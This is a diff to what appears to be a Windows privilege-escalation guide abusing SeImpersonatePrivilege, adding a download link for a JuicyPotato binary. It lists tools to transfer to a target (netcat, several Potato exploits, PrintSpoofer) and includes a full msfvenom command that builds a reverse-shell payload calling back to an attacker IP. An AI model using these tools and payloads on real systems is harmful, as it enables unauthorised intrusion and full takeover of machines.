@@ -39,7 +39,7 @@ From the above scenarion there many ways you can try to exploit this but actuall
 ## first thing were gonna need is transfering the following binaries into our target machine 
 1. nc.exe (specific for windows) - [windows netcat](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/nc.exe) - 🖥️ click the link to download the binary download 
 2. RoguePotato.exe - [RoguePotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/RoguePotato.md) - 🖥️ roguepotato binary usage And you can download it from here [binary](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/rogue.exe) 
-3. JuicyPotato - [JuicyPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/JuicyPotato.md) - 🖥️ JuicyPotato binary usage
+3. JuicyPotato - [JuicyPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/JuicyPotato.md) - 🖥️ JuicyPotato binary usage And you can download the from here [binary](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/JuicyPotato.exe)
 4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
 5. PrintSpoofer - [PrintSpoofer.md](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/PrintSpoofer.md) - 🖥️ PrintSpoofer binary usage
 6. GodPotato - [GodPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/Godpotato.md) - 🖥️ GodPotato binary usage
